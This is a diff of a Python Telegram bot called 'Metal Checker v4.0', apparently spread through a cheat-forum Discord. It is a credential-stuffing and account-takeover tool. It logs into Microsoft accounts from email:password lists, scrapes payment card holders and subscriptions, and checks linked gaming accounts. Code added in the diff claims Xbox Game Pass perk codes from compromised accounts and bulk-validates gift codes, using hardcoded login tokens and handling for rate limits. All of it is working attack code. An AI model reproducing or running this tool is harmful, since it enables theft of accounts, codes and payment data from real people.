@@ -1,8 +1,9 @@
 # ==============================================================================
-# METAL CHECKER v3.0 - THE ULTIMATE TELEGRAM BOT EDITION
+# METAL CHECKER v4.0 - THE ULTIMATE TELEGRAM BOT EDITION (INTEGRATED)
 # Coded by: @vantrexXxx
 # Supported by: Metal Drops & Icardi
 # Discord: discord.gg/cheatglobal
+# Features: Checker, Fetcher, Validator, Sorter (No HWID Limits)
 # ==============================================================================
 
 import telebot
@@ -15,13 +16,15 @@ import time
 import os
 import sys
 import shutil
-import base64
+import random
+import string
+import queue
 from datetime import datetime, timezone
 from pathlib import Path
 from threading import Lock, Thread, Event
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict, deque
-from urllib.parse import quote, unquote
+from urllib.parse import quote, unquote, urlparse, parse_qs
 
 # -----------------------------------------
 # GLOBAL SETTINGS, TOKENS & STATES
@@ -36,7 +39,7 @@ active_tasks = {}
 stop_flags = {}
 
 # -----------------------------------------
-# CORE CHECKER ENGINE (INTEGRATED FROM MAIN.PY)
+# 1. CORE CHECKER ENGINE (DOKUNULMADI)
 # -----------------------------------------
 class UnifiedChecker:
     def __init__(self, keywords=None, api_mode=2, check_mode="both"):
@@ -117,7 +120,6 @@ class UnifiedChecker:
                 "Referer": "https://account.microsoft.com/"
             }
             
-            # Balance & Cards
             try:
                 payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                 r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
@@ -128,7 +130,6 @@ class UnifiedChecker:
                     if card_match: sub_data['card_holder'] = card_match.group(1)
             except: pass
             
-            # Subs
             try:
                 trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                 r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
@@ -304,9 +305,6 @@ class UnifiedChecker:
             return {"minecraft_status": "FREE", "minecraft_username": None}
         except: return {"minecraft_status": "ERROR", "minecraft_username": None}
 
-    # ==========================================
-    # ROBLOX ALTYAPISI (DOKUNULMADAN EKLENDİ)
-    # ==========================================
     def GIDD(self, username):
         url = "https://users.roblox.com/v1/usernames/users"
         payload = {"usernames": [username], "excludeBannedUsers": False}
@@ -407,9 +405,6 @@ class UnifiedChecker:
             return {"roblox_status": "FREE", "data": {}}
         except: return {"roblox_status": "ERROR", "data": {}}
 
-    # ==========================================
-    # ANA CHECK DONGUSU
-    # ==========================================
     def check(self, email, password):
         try:
             url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
@@ -487,7 +482,333 @@ class UnifiedChecker:
         except Exception: return {"status": "ERROR"}
 
 # -----------------------------------------
-# RESULT MANAGER (DYNAMIC .TXT / .ZIP DELIVERY)
+# 2. XBOX CODE FETCHER & VALIDATOR ENGINE
+# -----------------------------------------
+class XboxCodeTools:
+    def __init__(self):
+        self.MICROSOFT_OAUTH_URL = (
+            'https://login.live.com/oauth20_authorize.srf'
+            '?client_id=00000000402B5328'
+            '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
+            '&scope=service::user.auth.xboxlive.com::MBI_SSL'
+            '&display=touch&response_type=token&locale=en'
+        )
+
+    # --- FETCH LOGIC ---
+    def fetch_oauth_tokens(self, session):
+        try:
+            response = session.get(self.MICROSOFT_OAUTH_URL, timeout=10)
+            text = response.text
+            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
+            if not match: return (None, None)
+            ppft = match.group(1)
+            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+            if not match: return (None, None)
+            return (match.group(1), ppft)
+        except: return (None, None)
+
+    def fetch_login(self, session, email, password, url_post, ppft):
+        try:
+            resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
+                               headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
+            if '#' in resp.url:
+                token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
+                if token != 'None': return token
+            if 'cancel?mkt=' in resp.text:
+                ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
+                pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
+                uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
+                action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
+                if ipt and pprid and uaid and action:
+                    ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=10)
+                    return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
+                    if return_url:
+                        fin = session.get(return_url.group(), allow_redirects=True, timeout=10)
+                        if '#' in fin.url:
+                            token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
+                            if token != 'None': return token
+            return None
+        except: return None
+
+    def get_xbox_tokens(self, session, rps_token):
+        try:
+            resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
+                json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
+                      'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
+                headers={'Content-Type': 'application/json'}, timeout=15)
+            if resp.status_code != 200: return (None, None)
+            user_token = resp.json().get('Token')
+            
+            resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
+                json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
+                      'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
+                headers={'Content-Type': 'application/json'}, timeout=15)
+            if resp.status_code != 200: return (None, None)
+            data = resp.json()
+            return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
+        except: return (None, None)
+
+    def fetch_codes_from_xbox(self, session, uhs, xsts_token):
+        try:
+            auth = f'XBL3.0 x={uhs};{xsts_token}'
+            resp = session.get('https://profile.gamepass.com/v2/offers',
+                headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
+            if resp.status_code != 200: return []
+            
+            codes = []
+            for offer in resp.json().get('offers', []):
+                resource = offer.get('resource')
+                if resource: codes.append(resource)
+                elif offer.get('offerStatus') == 'available':
+                    cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
+                    claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
+                        headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
+                        data='', timeout=15)
+                    if claim_resp.status_code == 200:
+                        code = claim_resp.json().get('resource')
+                        if code: codes.append(code)
+            return codes
+        except: return []
+
+    # --- VALIDATE LOGIC ---
+    def generate_reference_id(self):
+        timestamp_val = int(time.time() // 30)
+        n = f'{timestamp_val:08X}'
+        o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
+        result_chars = []
+        for e in range(64):
+            if e % 8 == 1: result_chars.append(n[(e - 1) // 8])
+            else: result_chars.append(o[e])
+        return "".join(result_chars)
+
+    def login_microsoft_account(self, email, password):
+        session = requests.Session()
+        session.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Referer': 'https://account.microsoft.com/',
+            'Origin': 'https://account.microsoft.com',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        try:    
+            login_response = session.post(
+                f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
+                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
+                headers = {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
+                },
+                allow_redirects=True, timeout=30
+            )
+            login_request = login_response.text.replace('\\', '')
+            reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
+            if not reurl_match: return None
+            reurl = reurl_match.group(1)
+            
+            try: reresp = session.get(reurl, timeout=30).text
+            except: return None
+                
+            actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
+            if not actch: return None
+            acu = actch.group(1)
+            input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
+            fta = {name: value for name, value in input_matches}
+            
+            try:
+                final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
+                if final_response.status_code != 200: return None
+            except: return None
+            return session
+        except: return None
+
+    def get_auth_token(self, session, force_refresh=False):
+        try:
+            if not force_refresh and hasattr(session, 'wlid_token'): return session.wlid_token
+            session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)
+            token_headers = {
+                'Accept': 'application/json', 'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache', 'Referer': 'https://account.microsoft.com/billing/redeem'
+            }
+            token_response = session.get(
+                'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
+                params={'scopes': 'MSComServiceMBISSL'}, headers=token_headers, timeout=15
+            )
+            if token_response.status_code != 200: return None
+            token_data = token_response.json()
+            if not token_data or len(token_data) == 0: return None
+            token = token_data[0]['token']
+            session.wlid_token = token
+            return token
+        except: return None
+
+    def get_store_cart_state(self, session, force_refresh=False):
+        try:
+            if force_refresh and hasattr(session, 'store_state'): delattr(session, 'store_state')
+            if not force_refresh and hasattr(session, 'store_state'): return session.store_state
+                
+            token = self.get_auth_token(session, force_refresh)
+            if not token: return None
+            ms_cv = "xddT7qMNbECeJpTq.6.2"
+            
+            url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
+            params = {'ms-cv': ms_cv, 'market': 'US', 'locale': 'en-GB', 'clientName': 'AccountMicrosoftCom'}
+            payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
+            
+            try: response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
+            except: return None
+                
+            text = response.text
+            match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
+            if not match: return None
+                
+            try:
+                store_state = json.loads(match.group(1))
+                extracted_values = {
+                    'ms_cv': store_state.get('appContext', {}).get('cv', ''),
+                    'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
+                    'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
+                    'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
+                    'muid': store_state.get('appContext', {}).get('muid', ''),
+                    'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
+                }
+                session.store_state = extracted_values
+                return extracted_values
+            except json.JSONDecodeError: return None
+        except: return None
+
+    def validate_code_primary(self, session, code, force_refresh_ids=False):
+        try:
+            if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
+                return {"status": "INVALID", "message": "Invalid code format"}
+            
+            store_state = self.get_store_cart_state(session, force_refresh=force_refresh_ids)
+            if not store_state:
+                store_state = self.get_store_cart_state(session, force_refresh=True)
+                if not store_state: return {"status": "ERROR", "message": "Failed to get store cart state"}
+            
+            token = self.get_auth_token(session, force_refresh=force_refresh_ids)
+            if not token:
+                token = self.get_auth_token(session, force_refresh=True)
+                if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
+            
+            try:
+                headers = {
+                    "host": "buynow.production.store-web.dynamics.com", "connection": "keep-alive",
+                    "x-ms-tracking-id": store_state['tracking_id'], "sec-ch-ua-platform": "\"Windows\"",
+                    "authorization": f"WLID1.0=t={token}", "x-ms-client-type": "AccountMicrosoftCom",
+                    "x-ms-market": "US", "ms-cv": store_state['ms_cv'], "x-ms-reference-id": self.generate_reference_id(),
+                    "x-ms-vector-id": store_state['vector_id'],
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
+                    "x-ms-correlation-id": store_state['correlation_id'], "content-type": "application/json",
+                    "x-authorization-muid": store_state['alternative_muid'], "accept": "*/*",
+                    "origin": "https://www.microsoft.com", "sec-fetch-site": "cross-site",
+                    "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.microsoft.com/",
+                    "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.9"
+                }
+                payload = {
+                    "market": "US", "language": "en-US",
+                    "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi","sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonenumber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
+                    "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False, "buyNowScenario": "redeem",
+                    "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
+                }
+                response = session.post(
+                    'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
+                    headers=headers, json=payload, timeout=30
+                )
+                if not response: return {"status": "ERROR", "message": "Request failed"}
+            except Exception as e: return {"status": "ERROR", "message": f"Request failed: {str(e)}"}
+            
+            if response.status_code == 429: return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
+            if response.status_code != 200: return {"status": "ERROR", "message": f"Request failed with status {response.status_code}"}
+                
+            data = response.json()
+            if "tokenType" in data and data["tokenType"] == "CSV":
+                return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
+            
+            if "errorCode" in data and data["errorCode"] == "TooManyRequests":
+                return {"status": "RATE_LIMITED", "message": "Account rate limited (TooManyRequests)"}
+            
+            if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
+                cart_event = data["events"]["cart"][0]
+                if "data" in cart_event and "reason" in cart_event["data"]:
+                    reason = cart_event["data"]["reason"]
+                    if "TooManyRequests" in reason or "RateLimit" in reason: return {"status": "RATE_LIMITED", "message": f"Account rate limited ({reason})"}
+                    if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
+                    elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"]: return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
+                    elif reason == "RedeemTokenStateDeactivated": return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
+                    elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
+                    elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
+                    else: return {"status": "INVALID", "message": f"{code} | INVALID"}
+            
+            if "products" in data and len(data["products"]) > 0:
+                product_info = data.get("productInfos", [{}])[0]
+                product_id = product_info.get("productId")
+                for product in data["products"]:
+                    if product.get("id") == product_id:
+                        product_title = product.get("sku", {}).get("title", product.get("title", "Unknown Title"))
+                        is_pi_required = product_info.get("isPIRequired", False)
+                        return {
+                            "status": "VALID_REQUIRES_CARD" if is_pi_required else "VALID",
+                            "product_title": product_title, "message": f"{code} | {product_title}"
+                        }
+            return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
+        except Exception as e: return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}
+
+    def extract_game_type(self, game_name):
+        game_name = game_name.upper()
+        if 'SUNSET SARSAPARILLA' in game_name: return '🥤 Sunset Sarsaparilla Bundle'
+        elif 'RAINBOW SIX SIEGE' in game_name: return '🔫 Rainbow Six Siege'
+        elif 'SKATE' in game_name: return '🛹 Skate Supercharge Pack'
+        elif 'MADDEN NFL' in game_name: return '🏈 Madden NFL Supercharge Pack'
+        elif 'WARFRAME' in game_name: return '⚔️ Warframe Bundle'
+        elif 'THRONE AND LIBERTY' in game_name: return '👑 Throne and Liberty'
+        elif 'DRIFT BUNDLE' in game_name: return '🚗 Drift Bundle'
+        elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name: return '❄️ Winter Xbox Benefits Pack'
+        elif 'JANG SAO' in game_name: return '🏆 Jang Sao Champions Bundle'
+        elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name: return '⭐ PSO2:NGS Monthly Bonus'
+        elif 'XBOX GAME PASS' in game_name: return '🎮 Xbox Game Pass'
+        elif 'BUNDLE' in game_name: return '🎁 Game Bundle'
+        elif 'PACK' in game_name: return '📦 Game Pack'
+        else: return '🎮 Other Games'
+
+    def format_game_codes_output(self, game_groups):
+        lines = []
+        sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
+        lines.append("🎮 SORTED GAME CODES 🎮")
+        lines.append("=" * 60)
+        lines.append("")
+        total_codes = 0
+        for game_type, codes_list in sorted_groups:
+            count = len(codes_list)
+            total_codes += count
+            lines.append(f"📋 {game_type} ({count} codes)")
+            lines.append("-" * 50)
+            codes_list.sort(key=lambda x: x[0])
+            code_counts = {}
+            for code, game_name in codes_list:
+                if code not in code_counts: code_counts[code] = []
+                code_counts[code].append(game_name)
+            for code, game_names in sorted(code_counts.items()):
+                if len(game_names) == 1: lines.append(f"{code} | {game_names[0]}")
+                else:
+                    lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
+                    for i, game_name in enumerate(game_names[1:], 1): lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
+            lines.append("")
+        lines.append("📊 SUMMARY")
+        lines.append("=" * 60)
+        lines.append(f"Total unique codes: {len(code_counts) if 'code_counts' in locals() else 0}")
+        lines.append(f"Total code entries: {total_codes}")
+        lines.append(f"Game categories: {len(game_groups)}")
+        return "\n".join(lines) + "\n"
+
+# -----------------------------------------
+# RESULT MANAGER & LIVE UI
 # -----------------------------------------
 class ResultManager:
     def __init__(self, chat_id, mode_name):
@@ -495,14 +816,11 @@ class ResultManager:
         self.mode = mode_name
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
         self.base_folder = f"results_{chat_id}_{timestamp}"
-        
         Path(self.base_folder).mkdir(parents=True, exist_ok=True)
         
-        # Dosya yolları
+        # Checker Dosyaları
         self.hits_file = os.path.join(self.base_folder, "hits.txt")
         self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
-        
-        # Spesifik mod dosyaları
         self.active_subs = os.path.join(self.base_folder, "active_subs.txt")
         self.expired_subs = os.path.join(self.base_folder, "expired_subs.txt")
         self.psn_file = os.path.join(self.base_folder, "psn_hits.txt")
@@ -512,12 +830,17 @@ class ResultManager:
         self.minecraft_file = os.path.join(self.base_folder, "minecraft_hits.txt")
         self.roblox_file = os.path.join(self.base_folder, "roblox_hits.txt")
         
+        # Code Manager Dosyaları
+        self.fetched_codes_file = os.path.join(self.base_folder, "fetched_codes.txt")
+        self.valid_codes_file = os.path.join(self.base_folder, "valid_codes.txt")
+        self.invalid_codes_file = os.path.join(self.base_folder, "invalid_codes.txt")
+        self.sorted_codes_file = os.path.join(self.base_folder, "sorted_codes.txt")
+        
     def save_hit(self, res):
+        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
         email, password = res['email'], res['password']
         base_str = f"{email}:{password}"
-        
-        with open(self.hits_file, 'a', encoding='utf-8') as f:
-            f.write(base_str + "\n")
+        with open(self.hits_file, 'a', encoding='utf-8') as f: f.write(base_str + "\n")
             
         if self.mode in ["microsoft", "both"]:
             subs = res.get("subscriptions", [])
@@ -530,41 +853,47 @@ class ResultManager:
         if self.mode in ["psn", "both"] and res.get("psn_orders", 0) > 0:
             purchases = res.get("psn_purchases", [])
             items = ", ".join([p.get('item', 'Unknown') for p in purchases[:3]])
-            with open(self.psn_file, 'a', encoding='utf-8') as f:
-                f.write(f"{base_str} | Orders: {res['psn_orders']} | Games: {items}\n")
+            with open(self.psn_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Orders: {res['psn_orders']} | Games: {items}\n")
                 
         if self.mode in ["steam", "both"] and res.get("steam_count", 0) > 0:
             games = ", ".join([p.get('game', 'Unknown') for p in res.get("steam_purchases", [])[:3]])
-            with open(self.steam_file, 'a', encoding='utf-8') as f:
-                f.write(f"{base_str} | Purchases: {res['steam_count']} | {games}\n")
+            with open(self.steam_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Purchases: {res['steam_count']} | {games}\n")
                 
         if self.mode in ["supercell", "both"] and res.get("supercell_games"):
-            with open(self.supercell_file, 'a', encoding='utf-8') as f:
-                f.write(f"{base_str} | Games: {', '.join(res['supercell_games'])}\n")
